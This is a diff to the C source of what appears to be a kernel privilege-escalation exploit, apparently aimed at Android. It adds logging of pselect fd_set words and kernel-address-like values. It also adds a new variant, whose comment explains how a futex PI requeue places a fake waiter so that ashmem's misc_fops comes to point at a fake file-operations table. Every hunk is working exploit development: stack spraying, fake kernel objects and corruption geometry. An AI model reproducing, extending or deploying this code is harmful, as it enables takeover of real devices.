@@ -99,6 +99,28 @@ static uint64_t slide_fdset_get_word(const fd_set *set, int word) {
   return value;
 }
 
+static void slide_dump_fdsets(const char *tag, const fd_set *in,
+                              const fd_set *out, const fd_set *ex,
+                              int words_per_set) {
+  char line[640];
+  int pos = snprintf(line, sizeof(line), "fdset %s words_per_set=%d",
+                     tag, words_per_set);
+  for (int i = 0; i < words_per_set; i++) {
+    uint64_t iv = slide_fdset_get_word(in, i);
+    uint64_t ov = slide_fdset_get_word(out, i);
+    uint64_t ev = slide_fdset_get_word(ex, i);
+    int n = snprintf(line + pos, sizeof(line) - (size_t)pos,
+                     " [%d]i=%016llx o=%016llx e=%016llx", i,
+                     (unsigned long long)iv, (unsigned long long)ov,
+                     (unsigned long long)ev);
+    if (n <= 0 || (size_t)(pos + n) >= sizeof(line)) {
+      break;
+    }
+    pos += n;
+  }
+  pr_info("%s\n", line);
+}
+
 static void slide_log_child_context(void) {
   char attr[256];
   char enforce[32];
@@ -205,6 +227,21 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
      * Isolate only the established FOPS PI-child direction here.
      */
     stack_pi_right = data_addr(ASHMEM_MISC_FOPS);
+    stack_pi_left = 0;
+    slide_pselect_production_stack = 1;
+  }
+#elif defined(SLIDE_FOPS_PI_LEFT_CHAIN) && SLIDE_FOPS_PI_LEFT_CHAIN
+  if (slide_oracle_parent == fake_fops &&
+      slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
+    /*
+     * The requeue moves the fake waiter from the lock waiter tree into the
+     * owner PI tree whose root is (misc_fops - 8).  The insert walk reads the
+     * parent priority at (misc_fops - 8) + 0x2c = misc_fops + 0x24 (upper
+     * u32 of the NULL ashmem read_iter) as 0 and therefore always descends
+     * left, landing at misc_fops + 0x00 with the value &waiter->pi_tree_entry
+     * == fake_fops.  Mirror that left chain in the fdset geometry.
+     */
+    stack_pi_right = data_addr(ASHMEM_MISC_FOPS) - 8;
     stack_pi_left = 0;
     slide_pselect_production_stack = 1;
   }
@@ -345,6 +382,12 @@ void slide_pselect_stack_copy(void) {
   fd_set ex;
   prepare_slide_pselect_fdsets(&in, &out, &ex);
   open_slide_selected_fds(&in, &out, &ex, high_read);
+  pr_info("slide pselect route fds block_fd=%d high_read=%d timerfd=%d "
+          "nfds=%d pad=%d\n",
+          block_fd, high_read, block_fd != pipefd[0], slide_pselect_nfds,
+          slide_syscall_pad);
+  slide_dump_fdsets("pre", &in, &out, &ex,
+                    slide_pselect_words_per_set());
 
   atomic_store(&slide_consume_stop, 0);
   atomic_store(&slide_consume_go, 0);
@@ -386,6 +429,8 @@ void slide_pselect_stack_copy(void) {
   size_t pselect_elapsed_usec =
       (gettime_ns() - pselect_started) / 1000ULL;
   atomic_store(&slide_consume_go, 0);
+  slide_dump_fdsets("post", &in, &out, &ex,
+                    slide_pselect_words_per_set());
 
   if (atomic_load(&slide_consume_enter_sched) != 0 &&
       !atomic_load(&slide_consume_stop)) {
@@ -916,6 +961,10 @@ static int slide_trigger_physical_slot(size_t slot) {
   if (!select_slide_payload_index(slot)) {
     return 0;
   }
+  pr_info("p0 physical slot select slot=%zu parent=%016zx target=%016zx "
+          "task=%016zx lock=%016zx waiter=%016zx nfds=%d\n",
+          slot, slide_oracle_parent, slide_oracle_target, fake_task,
+          fake_lock, fake_w0, PSELECT_ROUTE_NFDS);
 
   int base_delay = (int)slide_enter_delay_usec();
 #if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
